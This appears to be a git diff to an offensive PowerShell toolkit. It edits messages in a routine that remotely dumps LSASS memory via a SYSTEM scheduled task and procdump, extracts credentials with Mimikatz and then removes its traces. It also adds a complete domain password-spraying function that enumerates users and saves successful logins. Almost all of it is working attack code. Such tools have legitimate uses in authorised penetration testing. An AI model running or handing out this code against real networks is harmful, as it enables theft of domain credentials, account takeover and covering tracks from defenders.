@@ -120,7 +120,7 @@ Break
 }
 Else {
     #Mount share to remote system.
-    Write-Host "##### Mounting a share to \\$ComputerName\C$ at $LocalShareLetter #####"
+    Write-Host "[*] Mounting a share to \\$ComputerName\C$ at $LocalShareLetter"
     $netuse_command = "cmd.exe /C net use $LocalShareLetter \\$ComputerName\C$ /user:$Domain\$User $Pass"
     $netuse_command_output = Invoke-Expression -Command:$netuse_command
 }
@@ -132,12 +132,12 @@ If ($ShareExists -eq $True) {
     Write-Host "$LocalShareLetter mounted successfully" 
 }
 Else {
-    Write-Host "$LocalShareLetter did not mount successfully. Maybe try specifying a different local drive letter with the '-LocalShareLetter' option."
+    Write-Host "ERROR: $LocalShareLetter did not mount successfully. Maybe try specifying a different local drive letter with the '-LocalShareLetter' option."
     Break
 }
 
     #Create a directory called C:\pd on the remote host
-Write-Host "##### Making a dir called 'pd' on the remote host #####"
+Write-Host "[*] Making a dir called 'pd' on the remote host"
 $mkdir = "cmd.exe /C mkdir $LocalShareLetter\pd"
 Invoke-Expression -Command:$mkdir
 
@@ -155,53 +155,53 @@ Break
     #Attempting to locate the required procdump.ps1 file. If it finds it it proceeds in copying it to the remote share
 $PdPs1Exists = Test-Path $ProcdumpLocation
 If ($PdPs1Exists -eq $False) {
-    Write-Host "##### The procdump.ps1 file was not located at $ProcdumpLocation. Creating it now. #####"
+    Write-Host "[*] The procdump.ps1 file was not located at $ProcdumpLocation. Creating it now."
     $create_local_pd_dir = "cmd.exe /C mkdir C:\pd"
     Invoke-Expression -Command:$create_local_pd_dir
     Write-Output $procdump_script | add-content $ProcdumpLocation
-    Write-Host "##### Copying over procdump.ps1 to $LocalShareLetter\pd\ #####"
-    $copy_procdump = "cmd.exe /C copy $ProcdumpLocation $LocalShareLetter\pd\ #####"
+    Write-Host "[*] Copying over procdump.ps1 to $LocalShareLetter\pd\"
+    $copy_procdump = "cmd.exe /C copy $ProcdumpLocation $LocalShareLetter\pd\"
     Invoke-Expression -Command:$copy_procdump
 }
 Else {
-    Write-Host "##### Copying over procdump.ps1 to $LocalShareLetter\pd\ #####"
-    $copy_procdump = "cmd.exe /C copy $ProcdumpLocation $LocalShareLetter\pd\ #####"
+    Write-Host "[*] Copying over procdump.ps1 to $LocalShareLetter\pd\"
+    $copy_procdump = "cmd.exe /C copy $ProcdumpLocation $LocalShareLetter\pd\"
     Invoke-Expression -Command:$copy_procdump
 }
 
 
     #Scheduling a task on the remote system
-Write-Host "##### Scheduling a task called $Taskname to create a memory dump of the LSASS process using procdump.ps1 #####"
+Write-Host "[*] Scheduling a task called $Taskname to create a memory dump of the LSASS process using procdump.ps1"
 $create_schtask = "cmd.exe /C schtasks /Create /TN $Taskname /S $ComputerName /U $Domain\$User /P $Pass /SC ONCE /ST 22:00:00 /TR 'powershell.exe -exec bypass -file C:\pd\procdump.ps1' /RU SYSTEM 2>&1"
 $schtask_output = Invoke-Expression -Command:$create_schtask
 Write-Host $schtask_output
 if ($schtask_output -match "SUCCESS"){
-    Write-Host "##### Running the scheduled task #####"
+    Write-Host "[*] Running the scheduled task"
     $run_schtask = "cmd.exe /C schtasks /Run /S $ComputerName /TN $Taskname /U $Domain\$User /P $Pass"
     Invoke-Expression -Command:$run_schtask
 }
 else{
-    Write-Host "Could not successfully schedule a task on the remote system. Ensure you are using credentials of an administrative user of the remote system."
+    Write-Host "ERROR: Could not successfully schedule a task on the remote system. Ensure you are using credentials of an administrative user of the remote system."
     Invoke-Expression -Command:$cleanup_remote_system
     Invoke-Expression -Command:$cleanup_share
 break
 }
-Write-Host "##### Sleeping for 5 seconds #####"
+Write-Host "[*] Sleeping for 5 seconds"
 Start-Sleep -s 5
 
 
     #Making a local dumps directory and copying the LSASS files over
 $LocalDirExists = Test-Path "$LocalShareLetter\pd\"
 If ($LocalDirExists -eq $True) {
-    Write-Host "##### Making a local directory at C:\pd\$ComputerName-dumps #####"
+    Write-Host "[*] Making a local directory at C:\pd\$ComputerName-dumps"
     $create_compdir = "cmd.exe /C mkdir C:\pd\$ComputerName-dumps"
     Invoke-Expression -Command:$create_compdir
-    Write-Host "##### Copying LSASS dump from remote host to local directory C:\pd\$ComputerName-dumps #####"
+    Write-Host "[*] Copying LSASS dump from remote host to local directory C:\pd\$ComputerName-dumps"
     $copy_dumps = "cmd.exe /C copy $LocalShareLetter\pd\*.dmp C:\pd\$ComputerName-dumps\"
     Invoke-Expression -Command:$copy_dumps
 }
 else{
-    Write-Host "##### Making a local directory at C:\pd\$ComputerName-dumps #####"
+    Write-Host "[*] Making a local directory at C:\pd\$ComputerName-dumps"
     $create_compdir_pd = "cmd.exe /C mkdir C:\pd"
     $create_compdir = "cmd.exe /C mkdir C:\pd\$ComputerName-dumps"
     Invoke-Expression -Command:$create_compdir_pd
@@ -209,13 +209,13 @@ else{
 }
 
     #Change names of LSASS dump files
-Write-Host "##### Changing name of dump files to $ComputerName-lsass1.dmp #####"
+Write-Host "[*] Changing name of dump files to $ComputerName-lsass1.dmp"
 cd "C:\pd\$ComputerName-dumps"
 Get-ChildItem -Path "C:\pd\$ComputerName-dumps\" | ForEach-Object -begin { $count=1 } -process { rename-item $_ -NewName "$ComputerName-lsass$count.dmp"; $count++ }
 cd "C:\pd\"
 
     #Running Invoke-Mimikatz against the dump
-Write-Host "##### Extracting credentials from LSASS files with Mimikatz #####"
+Write-Host "[*] Extracting credentials from LSASS files with Mimikatz"
 $dumps = Get-ChildItem "C:\pd\$ComputerName-dumps\*.dmp"
 ForEach ($lsassfile in $dumps) {
 Invoke-Mimikatz -Command @" 
@@ -223,14 +223,14 @@ Invoke-Mimikatz -Command @"
 "@ >> C:\pd\$ComputerName-dumps\mimikatz-report.txt
 }
 
-Write-Host "The full Mimikatz output has been written to C:\pd\$ComputerName-dumps\mimikatz-report.txt!!"
-Write-Host "##### Sleeping for 5 seconds #####"
+Write-Host "[*] The full Mimikatz output has been written to C:\pd\$ComputerName-dumps\mimikatz-report.txt!!"
+Write-Host "[*] Sleeping for 5 seconds"
 Start-Sleep -s 5
 
     #Cleaning up the local lsass1.dmp, remote pd directory, attached share, and remote scheduled task
-Write-Host "##### Starting cleanup on remote host #####"
+Write-Host "[*] Starting cleanup on remote host"
 
-Write-Host "##### Removing C:\pd directory from remote host #####"
+Write-Host "[*] Removing C:\pd directory from remote host"
 $cleanup_remote_system = "cmd.exe /C rmdir /q /s $LocalShareLetter\pd"
 Invoke-Expression -Command:$cleanup_remote_system
 $RemoteShareExists = Test-Path "$LocalShareLetter\pd"
@@ -240,15 +240,15 @@ If ($RemoteShareExists -eq $True) {
 else{
     Write-Host "Remote directory removed successfully."
 }
-Write-Host "##### Removing $LocalShareLetter share from local system #####"
+Write-Host "[*] Removing $LocalShareLetter share from local system"
 $cleanup_share = "cmd.exe /C net use $LocalShareLetter /delete"
 Invoke-Expression -Command:$cleanup_share
 
-Write-Host "##### Removing C:\pd\procdump.ps1 from local system #####"
+Write-Host "[*] Removing C:\pd\procdump.ps1 from local system"
 $cleanup_procdump = "cmd.exe /C del C:\pd\procdump.ps1"
 Invoke-Expression -Command:$cleanup_procdump
 
-Write-Host "##### Deleting $Taskname scheduled task on remote system #####"
+Write-Host "[*] Deleting $Taskname scheduled task on remote system"
 $cleanup_schtask = "cmd.exe /C schtasks /Delete /TN $Taskname /F /S $ComputerName /U $Domain\$User /P $Pass 2>&1"
 $cleanup_schtask_output = Invoke-Expression -Command:$cleanup_schtask
 Write-Host $cleanup_schtask_output
@@ -5918,4 +5918,199 @@ Function Main
 }
 
 Main
+}
+
+
+
+function Invoke-DomainPasswordSpray{
+<#
+.SYNOPSIS
+
+This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.
+
+PivotAll Function: Invoke-DomainPasswordSpray
+Author: Beau Bullock (@dafthack) and Brian Fehrman (@fullmetalcache)
+License: BSD 3-Clause
+Required Dependencies: None
+Optional Dependencies: None
+
+.DESCRIPTION
+
+This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.
+
+.PARAMETER UserList
+
+Optional UserList parameter. This will be generated automatically if not specified
+
+.PARAMETER Domain
+
+Active directory domain name
+
+.PARAMETER Password
+
+A single password that will be used to perform the password spray
+
+.PARAMETER PasswordList
+
+A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts)
+
+.PARAMETER DomainController
+
+Optional DomainController parameter. The script will attempt to find this but it can be specified manually
+
+.EXAMPLE
+
+C:\PS> Invoke-DomainPasswordSpray -Domain Testing123 -Password Spring2016
+
+Description
+-----------
+This command will automatically generate a list of users from the domain Testing123 and attempt to mount a share to the domain controller's IPC$ share using each username and a password of Spring2016.
+
+.EXAMPLE
+
+C:\PS> Invoke-DomainPasswordSpray -Domain Testing123 -UserList users.txt -PasswordList passlist.txt
+
+Description
+-----------
+This command will use the userlist at users.txt and try to mount a share to the domain controller's IPC$ share using each password in the passlist.txt file one at a time.
+
+
+#>
+Param(
+ [Parameter(Position = 0, Mandatory = $false)]
+ [string]
+ $DomainController,
+
+ [Parameter(Position = 1, Mandatory = $true)]
+ [string]
+ $Domain,
+
+ [Parameter(Position = 2, Mandatory = $false)]
+ [string]
+ $UserList = "C:\temp\DomainUserList.txt",
+
+ [Parameter(Position = 3, Mandatory = $false)]
+ [string]
+ $Password,
+
+ [Parameter(Position = 4, Mandatory = $false)]
+ [string]
+ $PasswordList
+)
+
+$UserListExists = Test-Path "$UserList"
+If ($UserListExists -eq $False) {
+    #Create a list of all domain users if not specified
+Write-Host "##### Making a list of all domain users  #####"
+$mkdir = "cmd.exe /C mkdir C:\temp\"
+Invoke-Expression -Command:$mkdir
+$net_users = "cmd.exe /C net users /domain > C:\temp\raw-users.txt"
+Invoke-Expression -Command:$net_users
+
+    # Moving Net Users output to one username per line
+$stripped_users = (Get-Content -Encoding Ascii "C:\temp\raw-users.txt" | select -Skip 6 | Where-Object {$_ -notmatch 'The command completed successfully.'}) 
+$trimmed = $stripped_users.Trim()
+$one_user_per_line = $trimmed -Replace '\s+',"`r`n"
+$one_user_per_line | Out-File -Encoding ascii C:\temp\DomainUserList.txt
+
+$del_raw = "cmd.exe /C del C:\temp\raw-users.txt"
+Invoke-Expression -Command:$del_raw
+}
+
+Write-Host "[*] Using $UserList as userlist to spray with"
+If (!$DomainController){$get_dc = "cmd.exe /C echo %logonserver% 2>&1"
+$DomainController = Invoke-Expression -Command:$get_dc
+}
+
+    # Tries connecting to the DC's sysvol directory to validate it is up
+$DCExists = Test-Path "$DomainController\sysvol\"
+If ($DCExists -eq $True) {
+    Write-Host "[*] Using Domain Controller $DomainController to spray against" 
+}
+Else{
+Write-Host "Could not connect to domain controller $DomainController! Try again or set another manually with the -DomainController flag."
+break
+}
+
+    # If a single password is selected do this
+$CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
+if ($Password)
+{
+$time = Get-Date
+Write-Host -ForegroundColor Yellow "[*] Password spraying has started. Current time is $($time.ToShortTimeString())"
+Write-Host "[*] This might take a while depending on the total number of users"
+$curr_user = 0
+$Users = Get-Content $UserList
+$count = $Users.count
+
+ForEach($User in $Users){
+$Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
+    If ($Domain_check.name -ne $null)
+    {
+    Add-Content C:\temp\sprayed-creds.txt $User`:$Password
+    Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
+    }
+    $curr_user+=1 
+    Write-Host -nonewline "$curr_user of $count users tested`r"
+    }
+Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
+Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to C:\temp\sprayed-creds.txt"
+}
+    # If a password list is selected do this
+ElseIf($PasswordList){
+    $Passwords = Get-Content $PasswordList
+
+    $net_accounts = "cmd.exe /C net accounts /domain > C:\temp\password-policy.txt"
+    Invoke-Expression -Command:$net_accounts
+
+    $stripped_policy = (Get-Content -Encoding Ascii "C:\temp\password-policy.txt" | Where-Object {$_ -like "*Lockout Observation Window*"}) 
+    $stripped_split_a, $stripped_split_b = $stripped_policy.split(':',2)
+    $observation_window_no_spaces = $stripped_split_b -Replace '\s+',""
+    [int]$observation_window = [convert]::ToInt32($observation_window_no_spaces, 10)
+    Write-Host -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"    
+    Write-Host -ForegroundColor Yellow "[*] The domain password policy observation window is set to $observation_window minutes."
+    Write-Host "[*] Setting a $observation_window minute wait in between sprays."
+    Start-Sleep -Seconds 5
+
+    Write-Host -ForegroundColor Yellow "[*] Password spraying has started."
+    Write-Host "[*] This might take a while depending on the total number of users"
+
+        ForEach($Password_Item in $Passwords){
+            $time = Get-Date
+            Write-Host "[*] Now trying password $Password_Item. Current time is $($time.ToShortTimeString())"
+            $curr_user = 0
+            $Users = Get-Content $UserList
+            $count = $Users.count
+
+            ForEach($User in $Users){
+            $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password_Item)
+            If ($Domain_check.name -ne $null)
+            {
+            Add-Content C:\temp\sprayed-creds.txt $User`:$Password_Item
+            Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password_Item"
+            }
+            $curr_user+=1 
+            Write-Host -nonewline "$curr_user of $count users tested`r"
+            }
+            Countdown-Timer -Seconds (60*$observation_window)
+        }
+        Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
+        Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to C:\temp\sprayed-creds.txt"
+}
+Else{
+Write-Host -ForegroundColor Red "The -Password or -PasswordList option must be specified"
+break
+}
+}
+Function Countdown-Timer
+{   
+    Param(
+        $Seconds = 1800,
+        $Message = "[*] Pausing to avoid account lockout."
+    )
+    ForEach ($Count in (1..$Seconds))
+    {   Write-Progress -Id 1 -Activity $Message -Status "Waiting for $($Seconds/60) minutes. $($Seconds - $Count) seconds remaining" -PercentComplete (($Count / $Seconds) * 100)
+        Start-Sleep -Seconds 1
+    }
+    Write-Progress -Id 1 -Activity $Message -Status "Completed" -PercentComplete 100 -Completed
 }
